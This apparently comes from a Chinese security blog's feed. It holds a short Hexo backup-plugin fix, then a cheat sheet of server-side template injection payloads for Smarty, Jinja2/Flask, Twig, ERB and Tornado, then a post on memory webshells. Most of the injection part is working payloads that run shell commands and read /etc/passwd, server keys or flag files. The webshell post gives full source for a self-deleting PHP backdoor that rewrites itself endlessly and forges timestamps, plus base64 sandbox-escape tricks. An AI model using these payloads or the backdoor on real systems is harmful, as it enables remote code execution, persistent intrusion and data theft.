<p><strong>theme</strong> 是主题名<br><strong>message</strong> 是自定义信息<br><strong>branchName</strong> 是分支名，用英文逗号和仓库名隔开备份</p>
</blockquote>
<p>但是在我进行最后一步 <code>hexo b</code>的时候，问题出现了</p>
<p><img src="http://img.npfs06.top/20210224110506.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>我在<code>node_modules/hexo-git-backup/git.js</code> 文件中加入一行以显示执行的命令 <del>（行77）</del></p>
<p><img src="http://img.npfs06.top/20210224112511.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>再次运行<code>hexo b</code>得到报错信息如下</p>
<p><img src="http://img.npfs06.top/20210224112612.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>以此可见错误原因。</p>
<p>为解决此问题，我做了如下的改动</p>
<p>我在<code>node_modules/hexo-git-backup/git.js</code> 文件中，将这一行<del>（行135）</del></p>
<blockquote>
<p>commands.push([‘push’, ‘-u’, t, ‘master:’ + repo[t].branch, ‘–force’]);<br>改成<br>commands.push([‘push’, ‘-u’, t, ‘backup:’ + repo[t].branch, ‘–force’]);</p>
</blockquote>
<p><img src="http://img.npfs06.top/20210224112539.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>然后在博客根目录配置文件<code>_config.yml</code>中将<code>github</code> 更改为<code>origin</code></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta"># backup</span></span><br><span class="line"><span class="symbol">backup:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  theme:</span> next-reloaded</span><br><span class="line"><span class="symbol">  message:</span> Back up my www.npfs06.top blog</span><br><span class="line"><span class="symbol">  repository:</span></span><br><span class="line"><span class="symbol">    origin:</span> https:<span class="comment">//github.com/xxxx/xxxx.github.io.git,backup</span></span><br></pre></td></tr></table></figure>
<p>重新运行<code>hexo b</code></p>
<p><img src="http://img.npfs06.top/20210224113023.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>问题解决！</p>
]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>模板注入常见payload</title>
    <url>/2020/04/23/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81payload/</url>
    <content><![CDATA[<p>模板(smart、Flask、jinjia2、TWIG、Ruby/ERB、tornado)注入常见payload<a id="more"></a></p>
<p><img src="https://img.npfs06.top/20210306094545.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="smarty注入payload"><a href="#smarty注入payload" class="headerlink" title="smarty注入payload"></a>smarty注入payload</h2><p>{if phpinfo()}{/if}<br>{if system(‘ls’)}{/if}<br>{ readfile(‘/flag’) }<br>{if show_source(‘/flag’)}{/if}<br>{if system(‘cat ../../../flag’)}{/if} </p>
<p>{system(‘cat /flag’)}<br>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令</p>
<hr>
<ul>
<li>().<strong>class</strong>.<strong>bases</strong> [0] .<strong>subclasses</strong>() [40] (r’/etc/passwd’).read()</li>
<li>().<strong>class</strong>.<strong>bases</strong> [0] .<strong>subclasses</strong>() [59] .<strong>init</strong>.func_globals.values() [13][‘eval’](‘__import__(“os”).popen(“ls /“).read()’ )</li>
</ul>
<hr>
<p>于是把id换成<code>ls -a</code>这里一定要<code>-a</code>，本来开局我就拿到了shell，但是因为没有加<code>-a</code>，于是没有想到flag在上目级录</p>
<p>执行<code>&#123;&#123; b['eval'] ('__import__("os").popen(""cat ../flag"").read()') &#125;&#125;</code></p>
<h2 id="FLASK"><a href="#FLASK" class="headerlink" title="FLASK"></a>FLASK</h2><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">().__class__.__bases__[0].__subclasses__() </span></span><br><span class="line"><span class="xml">---查看可用模块</span></span><br><span class="line"></span><br><span class="line"><span class="xml">().__class__.base__.__subclasses__().index(warnings.catch_warnings)</span></span><br><span class="line"><span class="xml">可以查看当前位置，不过题目环境不能用。手动数吧= = 169位</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__bases__</span>[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"> </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">发现可以执行，构造命令</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;&#x27;.__class__.__mro__</span>[1].__subclasses__()</span></span><br><span class="line"><span class="template-variable">[169].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">没有什么过滤= =友好!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">或者找到os._wrap_close模块 117个</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;dir&#x27;</span>).read()&#125;&#125;</span><span class="xml">  </span></span><br><span class="line"></span><br><span class="line"><span class="xml">当前文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span></span><br><span class="line"><span class="xml">来打开文件，payload有很多慢慢摸索慢慢积累= =</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(&lt;<span class="name">command</span>&gt;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">内含os模块的类 class&#x27;site._Printer&#x27;   （不需要import os）</span></span><br><span class="line"><span class="xml">       a. 目录查询</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br><span class="line"><span class="xml">        因为这里listdir同样被ban了</span></span><br><span class="line"><span class="xml">      b.  读取目录flasklight</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;ls /flasklight&#x27;</span>).read()&#125;&#125;</span></span><br><span class="line"><span class="xml">       c. 读取flag</span></span><br><span class="line"><span class="xml">        </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(<span class="name">&#x27;cat coomme_geeeett_youur_flek&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>


<h2 id="jinjia2"><a href="#jinjia2" class="headerlink" title="jinjia2"></a>jinjia2</h2><figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">测试：  </span><span class="template-variable">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><span class="xml">  #输出7777777</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> 1 %&#125;</span><span class="xml">1</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<p>直接注入</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> &#x27;eval&#x27; <span class="keyword">in</span> b.keys() %&#125;</span></span><br><span class="line"><span class="xml">      </span><span class="template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span></span><br><span class="line"><span class="xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="xml">  </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="template-variable">&#123;&#123; <span class="name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;__im&#x27;+&#x27;port__&#x27;](<span class="name">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="name">&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>




<h2 id="TWIG"><a href="#TWIG" class="headerlink" title="TWIG"></a>TWIG</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">测试： &#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125;  #输出<span class="number">49</span></span><br><span class="line">测试：  &#123;#comment#&#125;&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;   #输出<span class="number">49</span></span><br><span class="line">这里&#123;#comment#&#125;是twig独有的注释符</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210306094611.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="name">1</span>,<span class="number">30</span>)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">app.request.files.get</span>(<span class="name">1</span>).__construct(<span class="name">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">app.request.files.get</span>(<span class="name">1</span>).openFile.fread(<span class="name">99</span>)&#125;&#125;</span></span><br><span class="line"><span class="xml">rce</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">_self.env.registerUndefinedFilterCallback</span>(<span class="name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;<span class="name">_self.env.getFilter</span>(<span class="name">&quot;id&quot;</span>)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">[&#x27;cat /etc/passwd&#x27;]</span>|filter(<span class="name">&#x27;system&#x27;</span>)&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">POST /subscribe?0=cat+/etc/passwd HTTP/1.1</span></span><br><span class="line"><span class="template-variable">&#123;&#123;<span class="name">app.request.query.filter</span>(<span class="name">0</span>,<span class="number">0</span>,<span class="number">1024</span>,&#123;<span class="string">&#x27;options&#x27;</span>:<span class="string">&#x27;system&#x27;</span>&#125;)&#125;&#125;</span></span><br></pre></td></tr></table></figure>




<h2 id="Ruby-ERB"><a href="#Ruby-ERB" class="headerlink" title="Ruby/ERB"></a>Ruby/ERB</h2><p>&lt;%=语法可以用来执行Ruby语句，并会尝试将结果转换为字符串，以附在最终的结果文本中。我们可以使用如下攻击载荷来尝试执行数学运算：</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">ruby &lt;%= <span class="number">7</span> * <span class="number">7</span> %&gt;</span><br><span class="line">ruby &lt;%= File.open(‘/etc/passwd’).read %&gt;</span><br><span class="line">ruby &lt;%= self %&gt;    <span class="comment">//枚举该对象可用的属性及方法</span></span><br><span class="line">ruby &lt;%= self.class.name %&gt;   <span class="comment">//获取self对象的类名</span></span><br><span class="line">ruby &lt;%= self.methods %&gt;</span><br><span class="line">ruby &lt;%= self.method(:handle_POST).parameters %&gt;  <span class="comment">//获取目标所需的具体参数</span></span><br><span class="line">ruby &lt;%= session.class.name %&gt;</span><br><span class="line">ruby &lt;%= self.instance_variables %&gt;</span><br><span class="line">ruby &lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br><span class="line">ruby &lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;   <span class="comment">//提取key值</span></span><br></pre></td></tr></table></figure>




<h2 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h2><p>参考链接：<a href="https://www.anquanke.com/post/id/244153#h2-4">https://www.anquanke.com/post/id/244153#h2-4</a></p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;xxx&#125;&#125;</span></span><br><span class="line"><span class="template-tag">&#123;%<span class="name">xxx</span>%&#125;</span></span><br><span class="line"><span class="comment">&#123;#xxx#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">//其中</span><span class="comment">&#123;##&#125;</span><span class="xml">是注释用的，里面的语句不会被执行，而</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">与</span><span class="template-tag">&#123;%%&#125;</span><span class="xml">则可以被用来执行命令。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">首先是</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">，这个标签可以说是非常危险，因为它里面可以执行任意的python函数，比如eval函数</span><span class="template-variable">&#123;&#123;<span class="name">eval</span>(<span class="name">&quot;xxx&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210723103123.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="xml">除了python中的内置函数可以被调用外，还有一些tornado自带的原生类也可以被用来命令执行，可以使用</span><span class="template-variable">&#123;&#123;<span class="name">globals</span>()&#125;&#125;</span><span class="xml">来查看所有可用的全局变量，如下图所示。</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210723103149.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<p>具体有哪些全局变量可以用，哪些变量可以被用来执行命令，各位大佬可以研究研究，我就不列举了。</p>
<p><code>&#123;%%&#125;`是`tornado`的另一个标签，它里面的语句受到限制，格式为`&#123;%操作名 参数%&#125;</code>，操作名在<code>tornado</code>的源码中进行了规定，具体源码在<code>tornado</code>库中的<code>template.py</code>中，以下为从源码中总结出来的所有操作名。</p>
<figure class="highlight nim"><table><tr><td class="code"><pre><span class="line">apply、autoescape、<span class="keyword">block</span>、comment、extends、<span class="keyword">for</span>、<span class="keyword">from</span>、<span class="keyword">if</span>、<span class="keyword">import</span>、<span class="keyword">include</span>、module、raw、<span class="built_in">set</span>、<span class="keyword">try</span>、<span class="keyword">while</span>、whitespace</span><br></pre></td></tr></table></figure>
<p>具体操作的意义请自行阅读源码，本文不再赘述，唯独介绍一下<code>raw</code> 操作，该操作可以执行原生的python代码。</p>
<img src="http://img.npfs06.top/20210723103221.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<p>懂我意思吧.jpg，各种python黑魔法走起</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>浅析php&amp;python内存马</title>
    <url>/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<p>浅析php&amp;python内存马<a id="more"></a></p>
<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>webshell的变迁过程大致如下所述：</p>
<p>web服务器管理页面——&gt; 大马——&gt;小马拉大马——&gt;一句话木马——&gt;加密一句话木马——&gt;加密内存马</p>
<img src="http://img.npfs06.top/20210927000700.png" style="zoom:80%;">



<p>传统Webshell连接方式，都是先通过某种漏洞将恶意的脚本木马文件上传，然后通过中国菜刀，或者蚁剑，冰蝎等Webshell管理软件进行链接。</p>
<img src="http://img.npfs06.top/20210929204425.png" style="zoom:80%;">



<p>这种方式目前仍然流行，但是由于近几年防火墙，IDS，IPS，流量分析等各种安全设备的普及和更新，这种连接方式非常容易被设备捕获拦截，而且由于文件是明文存放在服务器端，所以又很容易被杀毒软件所查杀。</p>
<pre><code>    内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，**Webshell内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地**。其通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。
</code></pre>
<h1 id="webshell内存马使用"><a href="#webshell内存马使用" class="headerlink" title="webshell内存马使用"></a>webshell内存马使用</h1><p>新版本的冰蝎，可以直接进行注入内存马</p>
<img src="http://img.npfs06.top/20210927001824.png" style="zoom:80%;">



<h1 id="PHP-内存马"><a href="#PHP-内存马" class="headerlink" title="PHP 内存马"></a>PHP 内存马</h1><p>PHP内存马想必大家都不陌生，是线下AWD中常用手段之一。在蚁剑中也有专门的插件可以一键注入内存马</p>
<p>php 内存马也就是 php 不死马，它的原理是将一个木马反复写入，在内存中执行死循环，使管理员无法删除木马文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="string">&#x27;/var/www/dvwa/.ski12.php&#x27;</span>;</span><br><span class="line">	<span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@system($_POST[a]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">		system(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .ski12.php&#x27;</span>);</span><br><span class="line">		usleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ignore_user_abort()函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。</li>
<li>set_time_limit()函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</li>
<li>unlink(<strong>FILE</strong>)删除文件本身，以起到隐蔽自身的作用。</li>
<li>while循环内每隔usleep(5000)即写新的后门文件，中间system()执行的命令用于修改文件的创建或修改时间，可以绕过<code>find –name \&#39;*.php\&#39; –mmin -10</code>命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。</li>
</ul>
<p>至于最后生成的隐蔽后门在需要校验一个POST参数的MD5值，原因在于防止其他人可以进行利用。</p>
<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><ul>
<li>检查所有 php 进程处理请求的持续时间</li>
<li>检测执行文件是否在文件系统真实存在</li>
</ul>
<h1 id="Python-内存马"><a href="#Python-内存马" class="headerlink" title="Python 内存马"></a>Python 内存马</h1><p>我们常用的python框架有django、flask。两者都可能存在ssti漏洞。</p>
<p>Python 内存马利用 flask 框架中 SSTI 注入来实现，flask 框架中在 web 应用模板渲染的过程中用到 <code>render_template_string()</code> 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。</p>
<blockquote>
<p>render_template_string() 用来渲染一个字符串</p>
</blockquote>
<p>在JAVA内存马中，实现最简单的内存马在于tomcat的路由机制filter。而我们想在python中实现内存马，首先需要考虑的是flask 是否能动态注册路由。</p>
<p>flask 常规注册的方式为使用装饰器 <code>@app.route()</code> 。而实际工作的函数为装饰器里调用的方法 <code>self.add_url_rule()</code> </p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">app.add<span class="constructor">_url_rule(&#x27;<span class="operator">/</span><span class="params">index</span><span class="operator">/</span>&#x27;,<span class="params">endpoint</span>=&#x27;<span class="params">index</span>&#x27;,<span class="params">view_func</span>=<span class="params">index</span>)</span></span><br></pre></td></tr></table></figure>
<p>self.add_url_rule的三个参数：</p>
<ol>
<li>url<br>与app.route()的第一个参数一样。必须以<code>/</code>开始</li>
<li>endpoint<br>站点，使用url_for进行反转时，这个里面传入的第一个参数时endpoint的值。url_for反转是通过视图函数名得到路径，所以若不指定该值，则默认值为函数名</li>
<li>view_func<br>方法。只需要写方法名（也可以为匿名参数），如果使用方法名不要加括号，加括号表示将函数的返回值传给了view_func参数了，程序就会直接报错</li>
</ol>
<h2 id="flask-context"><a href="#flask-context" class="headerlink" title="flask context"></a>flask context</h2><p>添加路由成功，想要实现内存webshell，关键在于view_func。view_func可以采用匿名函数的方式，该函数要实现实现捕获参数值、执行命令、响应。</p>
<p>Flask 的工作原理：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">当一个网页请求进入 Flask，会实例化一个Request Context。在python中分出了两种上下文，请求上下文(request <span class="built_in">context</span>)和应用上下文(session <span class="built_in">context</span>)。一个请求上下文中封装了请求的信息。而上下文的结构是运用了一个Stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。request <span class="built_in">context</span>实例化后，它会被<span class="built_in">push</span>到栈_request_ctx_stack中，那我们可以通过获取栈顶元素的方法来获取当前的请求。</span><br></pre></td></tr></table></figure>


<h2 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h2><p>Flask使用Jinja2渲染引擎，以<code>&#123;&#123;&#125;&#125;`作为变量包裹的标识符同时，这个符号包裹内还可以执行一些简单的表达式 ,模板引擎会对输入变量进行编码转义

**对象的魔术方法：**

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>


虽然通过 `&#123;&#123;...&#125;&#125;</code> 执行表达式，但是命名空间是受限的，没有 <code>builtins</code>，所以 <code>eval</code>、<code>popen</code> 这些函数是不能使用的。但是我们可以通过任意一个函数的 <code>func_globals</code> 从而得到其命名空间，进而得到 <code>builtins</code>。</p>
<h3 id="builtins-函数科普"><a href="#builtins-函数科普" class="headerlink" title="__builtins__ 函数科普"></a>__builtins__ 函数科普</h3><p>这里简单介绍下python的内置函数_<em>builtins_\</em> 。通过dir(__builtins__)可以查看内置函数，展示所有内置类型和函数。</p>
<img src="http://img.npfs06.top/20210930001322.png" style="zoom:80%;">

<p>我们先来看最基础的__import__函数</p>
<p># 直接调用</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.system</span>(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210930001355.png" style="zoom:80%;">

<p># 通过dict访问</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">__builtins__</span>.</span><span class="module"><span class="identifier">__dict__</span>[</span></span>‘import<span class="constructor">__(&#x27;<span class="params">os</span>&#x27;)</span>’].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210930001417.png" style="zoom:80%;">

<p> 玩一些花样-转码</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__builtins__</span><span class="selector-class">.__dict__</span><span class="selector-attr">[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)]</span>(<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="selector-class">.system</span>(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210930001449.png" style="zoom:80%;">

<p>此外还有file、open、eval等函数</p>
